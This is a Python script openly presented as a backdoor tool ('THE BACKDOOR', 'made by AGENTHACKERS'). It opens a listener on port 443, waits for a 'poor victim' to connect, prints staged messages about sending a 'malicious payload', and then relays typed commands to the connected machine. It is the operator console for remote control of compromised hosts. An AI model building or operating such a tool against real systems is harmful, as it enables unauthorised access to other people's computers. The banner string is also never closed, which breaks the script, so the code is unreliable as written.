import os
import time
import sys
import socket

BLUE = '\033[34m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
RESET = '\033[0m'

HOST = 'localhost'  # The server's hostname or IP address
PORT = 443       # The port used by the server
BUFFER_SIZE =1024

BANNER = '''

       ███████╗░█████╗░███╗░░██╗███████╗██████╗░░██████╗██╗░░░██╗
      ██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗██╔════╝╚██╗░██╔╝
      █████╗░░██║░░██║██╔██╗██║█████╗░░██████╔╝╚█████╗░░╚████╔╝░
      ██╔══╝░░██║░░██║██║╚████║██╔══╝░░██╔══██╗░╚═══██╗░░╚██╔╝░░
      ██║░░░░░╚█████╔╝██║░╚███║███████╗██║░░██║██████╔╝░░░██║░░░
      ╚═╝░░░░░░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░
                        [THE BACKDOOR]
                  This tool made by AGENTHACKERS



def send_command(conn, command):
    conn.sendall(command.encode())
    data = conn.recv(1024).decode()
    print(data)


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        os.system('cls' if os.name=='nt' else 'clear')
        print(BANNER)
        print(YELLOW + f"[*] Listening on {HOST}:{PORT} untill the poor victim connected" +RESET)
        conn, addr = s.accept()
        with conn:
            os.system('cls' if os.name=='nt' else 'clear')
            print(BANNER)
            print(GREEN + f"[#] Connection established with {addr[0]}:{addr[1]}" + RESET)
            print(GREEN + '[#]Hacked in to the address:', addr, RESET)
            print(BLUE + '[#] Sending malicious payload to the client>>>' + RESET)
            time.sleep(2)
            os.system('cls' if os.name=='nt' else 'clear')
            print(BANNER)
            print(GREEN + f"[#] Connection established with {addr[0]}:{addr[1]}" + RESET)
            print(BLUE + '[#] Sending malicious payload to the client>>>>>' + RESET)
            time.sleep(2)
            os.system('cls' if os.name=='nt' else 'clear')
            print(BANNER)
            print(GREEN + f"[#] Connection established with {addr[0]}:{addr[1]}" + RESET)
            print(BLUE + '[#] Sending malicious payload to the client>>>>>>>>' + RESET)
            time.sleep(2)
            print(GREEN + 'Malicious payload sended' + RESET)
            time.sleep(2)
            while True:
                command = input("Enter a command: ")
                if command.lower() == "exit":
                    send_command(conn, command)
                    break
                elif command.startswith("run "):
                    send_command(conn, command)
                    output = conn.recv(1024).decode()
                    print(output)
                else:
                    send_command(conn, command)
                    

if __name__ == "__main__":
    main()
